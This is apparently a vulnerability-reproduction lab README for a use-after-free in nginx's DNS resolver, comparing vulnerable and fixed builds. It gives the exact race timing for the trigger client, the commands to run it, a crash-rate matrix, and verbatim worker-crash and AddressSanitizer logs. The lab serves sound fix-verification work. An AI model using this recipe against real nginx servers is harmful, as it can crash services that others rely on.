# CVE-2026-123634 — nginx DNS-resolver use-after-free (1.31.8, fixed 1.31.9)

Docker-only sibling lab (S4) of the NGINX2Root suite. A request-derived
`proxy_pass http://$host` plus `mirror` lands the main request and its
mirror subrequest on the **same resolver node**; when the resolver's
failure walk processes a held-back SERVFAIL, the *first* handler's 502
send fails on an RST'd client socket, `ngx_http_terminate_request` tears
down the whole request tree — including the **sibling** (mirror) resolver
ctx — while the walk still holds a pointer to it. Walk iteration 2 then
writes through the freed ctx: heap use-after-free, SIGSEGV on stock
glibc, a verbatim AddressSanitizer report on the instrumented build.

## Layout

| Service | Port (loopback) | What |
|---|---|---|
| `vuln` | 29640 | stock nginx **1.31.8** (tarball sha256-pinned, digest-pinned base) |
| `fixed` | 29644 | stock nginx **1.31.9** (same discipline) |
| `vuln-asan` | 29645 | 1.31.8, ASAN-instrumented (`ASAN_OPTIONS=detect_leaks=0:abort_on_error=1`) |
| `fixed-asan` | 29646 | 1.31.9, ASAN-instrumented (the no-report control) |
| `dns` | internal only | `dns/dnsd.py` — behavior encoded in the query name `<mode>-<delay_ms>-<seq>.u123634.test` (sf=servfail, rf=refused, nx=nxdomain, ok=A 127.0.0.1, drop=timeout) |
| `probe` | — | stdlib trigger client `poc/123634/trigger.py` |

Lab ports 29641/29642 are deliberately left free for the root lab's
ephemeral overlay; single worker per nginx so a worker death is
unambiguous. Ports stay within the lab's assigned 29640-29649 range,
bound to 127.0.0.1 only.

## The trigger (poc/123634/trigger.py)

`POST` with `Content-Length: 8`, `Host: <fresh-name>`; the client then
drives the interleaving (every socket has `settimeout`, each attempt
runs under a SIGALRM watchdog — the client can never hang its shell):

1. **headers** -> mirror subrequest posts, resolves first (its ctx waits
   on the resolver node);
2. **body** (t+`--t-body`) -> the main request's proxy_pass starts, its
   ctx attaches to the *same* node;
3. **RST** (t+`--t-body`+`--t-rst`, SO_LINGER 0) -> nginx does not notice
   yet (read event blocked after the body);
4. **DNS failure answer** (`--answer-ms` hold, name-encoded) ->
   `ngx_resolver_process_a` walks the node's waiting list:
   - iteration 1 (main ctx): handler finalizes a 502; the send hits the
     dead socket -> `ngx_http_terminate_request` -> the mirror's
     upstream cleanup calls `ngx_resolve_name_done` on the mirror ctx;
     `rn->waiting` is already NULL -> **ALERT "could not cancel ...
     resolving"** -> ctx freed;
   - iteration 2 (mirror ctx): `ngx_resolver.c:2142` writes through the
     freed pointer -> UAF.

The race needs the RST and the answer to land close together: the RST
must still be *unnoticed* when the walk runs (too early = clean unlink,
too late = the socket death is processed before the walk and the 502
path never terminates inside it).

## Interleaving matrix (observed, stock pair; 5 attempts per cell)

| answer hold | RST at | stock 1.31.8 | stock 1.31.9 |
|---|---|---|---|
| 10 ms | 7 ms | survives (RST beats body processing) | survives |
| 50 ms | 50 ms | **WORKER DIED** (1/5) | survives |
| 100 ms | 100 ms | **WORKER DIED** (1/5) | survives |
| 200 ms | 200 ms | **WORKER DIED** (1/5) | survives |
| 300 ms | 300 ms | **WORKER DIED** (1/5; 2/5 in the earlier sweep) | survives |
| 500 ms | 300 ms | survives (RST processed before the walk) | survives |
| answer-then-RST (300) | 900 ms | survives (negative control) | survives |
| half-close (FIN) | — | survives (no EPIPE -> no terminate in-walk) | survives |
| RST before body | 0 ms | survives (terminate outside the walk) | survives |
| no RST | — | clean 502s, both handlers run orderly | survives |

The crash is probabilistic per attempt (observed ~20-40 % per attempt at
the 50-300 ms holds); the harness uses repeat counts so a run virtually
always lands at least one hit. Fixed 1.31.9 produced **zero** ALERT
lines and **zero** worker deaths under every cell — the 1.31.9 fix
demoted the ALERT to debug and (the actual fix) makes the resolver walk
snapshot-safe against sibling termination.

## Verbatim evidence

Stock 1.31.8 (docker compose logs vuln; the chain per hit, ~1 s apart):

```
2026/11/19 22:09:53 [alert] 21#0: could not cancel sf-300-0.u123634.test resolving
2026/11/19 22:09:53 [alert] 21#0: *513 http request count is zero while closing request, client: 172.29.0.5, server: 0.0.0.0:8080
2026/11/19 22:09:53 [alert] 1#0: worker process 21 exited on signal 11 (core dumped)
2026/11/19 22:09:53 [notice] 1#0: start worker process 2571
```

ASAN floor (docker compose logs vuln-asan; same trigger, answer 300 ms):

```
2026/11/19 22:37:33 [alert] 51#0: could not cancel sf-300-4.u123634.test resolving
==51==ERROR: AddressSanitizer: heap-use-after-free on address 0x611000014920 ...
WRITE of size 8 at 0x611000014920 thread T0
    #0 0x5ad74139ae51 in ngx_resolver_process_a src/core/ngx_resolver.c:2142
    #1 ... ngx_resolver_process_response ... ngx_resolver_udp_read ...
freed by thread T0 here:
    #1 ngx_resolver_free_locked src/core/ngx_resolver.c:4198
    #2 ngx_resolve_name_done src/core/ngx_resolver.c:595
    #3 ngx_http_upstream_finalize_request src/http/ngx_http_upstream.c:4803
    #4 ngx_http_upstream_cleanup src/http/ngx_http_upstream.c:4780
    #5 ngx_http_terminate_request src/http/ngx_http_request.c:2954
    ... #9 ngx_http_upstream_resolve_handler src/http/ngx_http_upstream.c:1271
previously allocated by thread T0 here:
    #4 ngx_resolve_start src/core/ngx_resolver.c:422
    #5 ngx_http_upstream_init_request src/http/ngx_http_upstream.c:806
SUMMARY: AddressSanitizer: heap-use-after-free src/core/ngx_resolver.c:2142 in ngx_resolver_process_a
```

The three stacks are the whole story: the mirror's ctx is allocated by
`ngx_resolve_start`, freed under `ngx_http_terminate_request` from the
*sibling's* resolve handler, then written by the walk at
`ngx_resolver.c:2142`. `fixed-asan` under the identical trigger:
**0 reports**, service healthy throughout.

## Runbook

```bash
cd lab/123634
./verify.sh                      # bounded one-command verdict (~2-3 min)
# manual:
timeout 600 docker compose up -d --build --wait
timeout 120 docker compose exec -T probe python /poc/123634/trigger.py \
    --target vuln:8080 --variant primary --answer-ms 300 --repeat 10
docker compose logs vuln --tail 40 | grep -E "could not cancel|exited on signal"
```

## Honest status

- Stock 1.31.8 worker death: **reproduced** (6 hits this session across
  the 50/100/200/300 ms cells, plus 2 hits found from the earlier
  21:34 sweep in the same container's log).
- ASAN floor: **captured verbatim** (2 reports; `abort_on_error=1` kills
  the worker, master respawns, service stays healthy).
- Fixed pair: **clean** — no ALERTs, no deaths, no ASAN reports under
  every trigger cell.
- Race is probabilistic; a `verify.sh` FAIL can mean "missed the race",
  not "no bug" — rerun. (10 attempts at the winning interleavings have
  not yet missed in practice.)

### ASAN build note (why the Dockerfile injects flags at make time)

Two earlier lab attempts stalled on the ASAN builds. Root causes found
and handled:

1. tarball `curl` with no time bounds (dead connection hangs the build
   forever) — fixed before this session: `--connect-timeout 10
   --max-time 120 --retry 3`;
2. `./configure` itself hung: its ASAN-instrumented test programs hang
   on this high-ASLR WSL2 kernel (~295 s deaths, reproducible), and
   `setarch -R` (ASLR off) is blocked by Docker's default seccomp
   (`personality(ADDR_NO_RANDOMIZE)` = EPERM, instant failures).
   Fix: configure runs plain (its tests are libc/compiler probes that
   do not depend on sanitizer semantics), and the sanitizer flags are
   injected at make time — `-fsanitize=address ...` appended to
   `CFLAGS` in `objs/Makefile`, link via `make LINK="cc
   -fsanitize=address"`. Every compiled object and the final binary
   are fully instrumented (the ASAN report above proves it), and the
   configure/make steps are separate RUN layers so bounded rebuilds
   resume at make.

Leftovers from the stalled attempts (kept as evidence, safe to remove):
dangling `asantest{,2,3}:latest` images (non-ASAN probes, incl. a
`vm.mmap_rnd_bits` sysctl probe) and the pre-existing 21:34 crash pair
in the `vuln` container log.
